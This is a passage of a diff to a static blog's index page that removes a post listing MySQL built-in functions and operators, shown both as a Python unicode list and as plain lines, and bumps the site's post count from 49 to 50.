u&apos;LOCALTIME(), LOCALTIME&apos;, u&apos;LOCALTIMESTAMP, LOCALTIMESTAMP()&apos;, u&apos;LOCATE()&apos;, u&apos;LOG()&apos;, u&apos;LOG10()&apos;, u&apos;LOG2()&apos;, u&apos;LOWER()&apos;, u&apos;LPAD()&apos;, u&apos;LTRIM()&apos;, u&apos;MAKE_SET()&apos;, u&apos;MAKEDATE()&apos;, u&apos;MAKETIME()&apos;, u&apos;MASTER_POS_WAIT()&apos;, u&apos;MATCH&apos;, u&apos;MAX()&apos;, u&apos;MBRContains()&apos;, u&apos;MBRDisjoint()&apos;, u&apos;MBREqual()&apos;, u&apos;MBRIntersects()&apos;, u&apos;MBROverlaps()&apos;, u&apos;MBRTouches()&apos;, u&apos;MBRWithin()&apos;, u&apos;MD5()&apos;, u&apos;MICROSECOND()&apos;, u&apos;MID()&apos;, u&apos;MIN()&apos;, u&apos;-&apos;, u&apos;MINUTE()&apos;, u&apos;MLineFromText(), MultiLineStringFromText()&apos;, u&apos;MLineFromWKB(), MultiLineStringFromWKB()&apos;, u&apos;MOD()&apos;, u&apos;%, MOD&apos;, u&apos;MONTH()&apos;, u&apos;MONTHNAME()&apos;, u&apos;MPointFromText(), MultiPointFromText()&apos;, u&apos;MPointFromWKB(), MultiPointFromWKB()&apos;, u&apos;MPolyFromText(), MultiPolygonFromText()&apos;, u&apos;MPolyFromWKB(), MultiPolygonFromWKB()&apos;, u&apos;MultiLineString()&apos;, u&apos;MultiPoint()&apos;, u&apos;MultiPolygon()&apos;, u&apos;NAME_CONST()&apos;, u&apos;NOT, !&apos;, u&apos;NOT BETWEEN ... AND ...&apos;, u&apos;!=, &lt;&gt;&apos;, u&apos;NOT IN()&apos;, u&apos;NOT LIKE&apos;, u&apos;NOT REGEXP&apos;, u&apos;NOW()&apos;, u&apos;NULLIF()&apos;, u&apos;NumGeometries()&apos;, u&apos;NumInteriorRings()&apos;, u&apos;NumPoints()&apos;, u&apos;OCT()&apos;, u&apos;OCTET_LENGTH()&apos;, u&apos;OLD_PASSWORD()&apos;, u&apos;||, OR&apos;, u&apos;ORD()&apos;, u&apos;Overlaps()&apos;, u&apos;PASSWORD()&apos;, u&apos;PERIOD_ADD()&apos;, u&apos;PERIOD_DIFF()&apos;, u&apos;PI()&apos;, u&apos;+&apos;, u&apos;Point()&apos;, u&apos;PointFromText()&apos;, u&apos;PointFromWKB()&apos;, u&apos;PointN()&apos;, u&apos;PolyFromText(), PolygonFromText()&apos;, u&apos;PolyFromWKB(), PolygonFromWKB()&apos;, u&apos;Polygon()&apos;, u&apos;POSITION()&apos;, u&apos;POW()&apos;, u&apos;POWER()&apos;, u&apos;PROCEDURE ANALYSE()&apos;, u&apos;QUARTER()&apos;, u&apos;QUOTE()&apos;, u&apos;RADIANS()&apos;, u&apos;RAND()&apos;, u&apos;REGEXP&apos;, u&apos;RELEASE_LOCK()&apos;, u&apos;REPEAT()&apos;, u&apos;REPLACE()&apos;, u&apos;REVERSE()&apos;, u&apos;RIGHT()&apos;, u&apos;&gt;&gt;&apos;, u&apos;RLIKE&apos;, u&apos;ROUND()&apos;, u&apos;ROW_COUNT()&apos;, u&apos;RPAD()&apos;, u&apos;RTRIM()&apos;, u&apos;SCHEMA()&apos;, u&apos;SEC_TO_TIME()&apos;, u&apos;SECOND()&apos;, u&apos;SESSION_USER()&apos;, u&apos;SHA1(), SHA()&apos;, u&apos;SHA2()&apos;, u&apos;SIGN()&apos;, u&apos;SIN()&apos;, u&apos;SLEEP()&apos;, u&apos;SOUNDEX()&apos;, u&apos;SOUNDS LIKE&apos;, u&apos;SPACE()&apos;, u&apos;SQRT()&apos;, u&apos;SRID()&apos;, u&apos;StartPoint()&apos;, u&apos;STD()&apos;, u&apos;STDDEV()&apos;, u&apos;STDDEV_POP()&apos;, u&apos;STDDEV_SAMP()&apos;, u&apos;STR_TO_DATE()&apos;, u&apos;STRCMP()&apos;, u&apos;SUBDATE()&apos;, u&apos;SUBSTR()&apos;, u&apos;SUBSTRING()&apos;, u&apos;SUBSTRING_INDEX()&apos;, u&apos;SUBTIME()&apos;, u&apos;SUM()&apos;, u&apos;SYSDATE()&apos;, u&apos;SYSTEM_USER()&apos;, u&apos;TAN()&apos;, u&apos;TIME()&apos;, u&apos;TIME_FORMAT()&apos;, u&apos;TIME_TO_SEC()&apos;, u&apos;TIMEDIFF()&apos;, u&apos;*&apos;, u&apos;TIMESTAMP()&apos;, u&apos;TIMESTAMPADD()&apos;, u&apos;TIMESTAMPDIFF()&apos;, u&apos;TO_DAYS()&apos;, u&apos;TO_SECONDS()&apos;, u&apos;Touches()&apos;, u&apos;TRIM()&apos;, u&apos;TRUNCATE()&apos;, u&apos;UCASE()&apos;, u&apos;-&apos;, u&apos;UNCOMPRESS()&apos;, u&apos;UNCOMPRESSED_LENGTH()&apos;, u&apos;UNHEX()&apos;, u&apos;UNIX_TIMESTAMP()&apos;, u&apos;UpdateXML()&apos;, u&apos;UPPER()&apos;, u&apos;USER()&apos;, u&apos;UTC_DATE()&apos;, u&apos;UTC_TIME()&apos;, u&apos;UTC_TIMESTAMP()&apos;, u&apos;UUID()&apos;, u&apos;UUID_SHORT()&apos;, u&apos;VALUES()&apos;, u&apos;VAR_POP()&apos;, u&apos;VAR_SAMP()&apos;, u&apos;VARIANCE()&apos;, u&apos;VERSION()&apos;, u&apos;WEEK()&apos;, u&apos;WEEKDAY()&apos;, u&apos;WEEKOFYEAR()&apos;, u&apos;Within()&apos;, u&apos;X()&apos;, u&apos;XOR&apos;, u&apos;Y()&apos;, u&apos;YEAR()&apos;, u&apos;YEARWEEK()&apos;]
-
-
-ABS()
-ACOS()
-ADDDATE()
-ADDTIME()
-AES_DECRYPT()
-AES_ENCRYPT()
-AND, &amp;&amp;
-Area()
-AsBinary(), AsWKB()
-ASCII()
-ASIN()
-=
-:=
-AsText(), AsWKT()
-ATAN()
-ATAN2(), ATAN()
-AVG()
-BENCHMARK()
-BETWEEN ... AND ...
-BIN()
-BINARY
-BIT_AND()
-BIT_COUNT()
-BIT_LENGTH()
-BIT_OR()
-BIT_XOR()
-&amp;
-~
-|
-^
-CASE
-CAST()
-CEIL()
-CEILING()
-Centroid()
-CHAR()
-CHAR_LENGTH()
-CHARACTER_LENGTH()
-CHARSET()
-COALESCE()
-COERCIBILITY()
-COLLATION()
-COMPRESS()
-CONCAT()
-CONCAT_WS()
-CONNECTION_ID()
-Contains()
-CONV()
-CONVERT()
-CONVERT_TZ()
-COS()
-COT()
-COUNT()
-COUNT(DISTINCT)
-CRC32()
-Crosses()
-CURDATE()
-CURRENT_DATE(), CURRENT_DATE
-CURRENT_TIME(), CURRENT_TIME
-CURRENT_TIMESTAMP(), CURRENT_TIMESTAMP
-CURRENT_USER(), CURRENT_USER
-CURTIME()
-DATABASE()
-DATE()
-DATE_ADD()
-DATE_FORMAT()
-DATE_SUB()
-DATEDIFF()
-DAY()
-DAYNAME()
-DAYOFMONTH()
-DAYOFWEEK()
-DAYOFYEAR()
-DECODE()
-DEFAULT()
-DEGREES()
-DES_DECRYPT()
-DES_ENCRYPT()
-Dimension()
-Disjoint()
-DIV
-/
-ELT()
-ENCODE()
-ENCRYPT()
-EndPoint()
-Envelope()
-=
-&lt;=&gt;
-Equals()
-EXP()
-EXPORT_SET()
-ExteriorRing()
-EXTRACT()
-ExtractValue()
-FIELD()
-FIND_IN_SET()
-FLOOR()
-FORMAT()
-FOUND_ROWS()
-FROM_DAYS()
-FROM_UNIXTIME()
-GeomCollFromText(), GeometryCollectionFromText()
-GeomCollFromWKB(), GeometryCollectionFromWKB()
-GeometryCollection()
-GeometryN()
-GeometryType()
-GeomFromText(), GeometryFromText()
-GeomFromWKB(), GeometryFromWKB()
-GET_FORMAT()
-GET_LOCK()
-GLength()
-&gt;
-&gt;=
-GREATEST()
-GROUP_CONCAT()
-HEX()
-HOUR()
-IF()
-IFNULL()
-IN()
-INET_ATON()
-INET_NTOA()
-INSERT()
-INSTR()
-InteriorRingN()
-Intersects()
-INTERVAL()
-IS
-IS_FREE_LOCK()
-IS NOT
-IS NOT NULL
-IS NULL
-IS_USED_LOCK()
-IsClosed()
-IsEmpty()
-ISNULL()
-IsSimple()
-LAST_DAY
-LAST_INSERT_ID()
-LCASE()
-LEAST()
-LEFT()
-&lt;&lt;
-LENGTH()
-&lt;
-&lt;=
-LIKE
-LineFromText(), LineStringFromText()
-LineFromWKB(), LineStringFromWKB()
-LineString()
-LN()
-LOAD_FILE()
-LOCALTIME(), LOCALTIME
-LOCALTIMESTAMP, LOCALTIMESTAMP()
-LOCATE()
-LOG()
-LOG10()
-LOG2()
-LOWER()
-LPAD()
-LTRIM()
-MAKE_SET()
-MAKEDATE()
-MAKETIME()
-MASTER_POS_WAIT()
-MATCH
-MAX()
-MBRContains()
-MBRDisjoint()
-MBREqual()
-MBRIntersects()
-MBROverlaps()
-MBRTouches()
-MBRWithin()
-MD5()
-MICROSECOND()
-MID()
-MIN()
--
-MINUTE()
-MLineFromText(), MultiLineStringFromText()
-MLineFromWKB(), MultiLineStringFromWKB()
-MOD()
-%, MOD
-MONTH()
-MONTHNAME()
-MPointFromText(), MultiPointFromText()
-MPointFromWKB(), MultiPointFromWKB()
-MPolyFromText(), MultiPolygonFromText()
-MPolyFromWKB(), MultiPolygonFromWKB()
-MultiLineString()
-MultiPoint()
-MultiPolygon()
-NAME_CONST()
-NOT, !
-NOT BETWEEN ... AND ...
-!=, &lt;&gt;
-NOT IN()
-NOT LIKE
-NOT REGEXP
-NOW()
-NULLIF()
-NumGeometries()
-NumInteriorRings()
-NumPoints()
-OCT()
-OCTET_LENGTH()
-OLD_PASSWORD()
-||, OR
-ORD()
-Overlaps()
-PASSWORD()
-PERIOD_ADD()
-PERIOD_DIFF()
-PI()
-+
-Point()
-PointFromText()
-PointFromWKB()
-PointN()
-PolyFromText(), PolygonFromText()
-PolyFromWKB(), PolygonFromWKB()
-Polygon()
-POSITION()
-POW()
-POWER()
-PROCEDURE ANALYSE()
-QUARTER()
-QUOTE()
-RADIANS()
-RAND()
-REGEXP
-RELEASE_LOCK()
-REPEAT()
-REPLACE()
-REVERSE()
-RIGHT()
-&gt;&gt;
-RLIKE
-ROUND()
-ROW_COUNT()
-RPAD()
-RTRIM()
-SCHEMA()
-SEC_TO_TIME()
-SECOND()
-SESSION_USER()
-SHA1(), SHA()
-SHA2()
-SIGN()
-SIN()
-SLEEP()
-SOUNDEX()
-SOUNDS LIKE
-SPACE()
-SQRT()
-SRID()
-StartPoint()
-STD()
-STDDEV()
-STDDEV_POP()
-STDDEV_SAMP()
-STR_TO_DATE()
-STRCMP()
-SUBDATE()
-SUBSTR()
-SUBSTRING()
-SUBSTRING_INDEX()
-SUBTIME()
-SUM()
-SYSDATE()
-SYSTEM_USER()
-TAN()
-TIME()
-TIME_FORMAT()
-TIME_TO_SEC()
-TIMEDIFF()
-*
-TIMESTAMP()
-TIMESTAMPADD()
-TIMESTAMPDIFF()
-TO_DAYS()
-TO_SECONDS()
-Touches()
-TRIM()
-TRUNCATE()
-UCASE()
--
-UNCOMPRESS()
-UNCOMPRESSED_LENGTH()
-UNHEX()
-UNIX_TIMESTAMP()
-UpdateXML()
-UPPER()
-USER()
-UTC_DATE()
-UTC_TIME()
-UTC_TIMESTAMP()
-UUID()
-UUID_SHORT()
-VALUES()
-VAR_POP()
-VAR_SAMP()
-VARIANCE()
-VERSION()
-WEEK()
-WEEKDAY()
-WEEKOFYEAR()
-Within()
-X()
-XOR
-Y()
-YEAR()
-YEARWEEK()
-</code></pre>
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2923,7 +2692,7 @@ YEARWEEK()
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">49</span>
+                    <span class="site-state-item-count">50</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
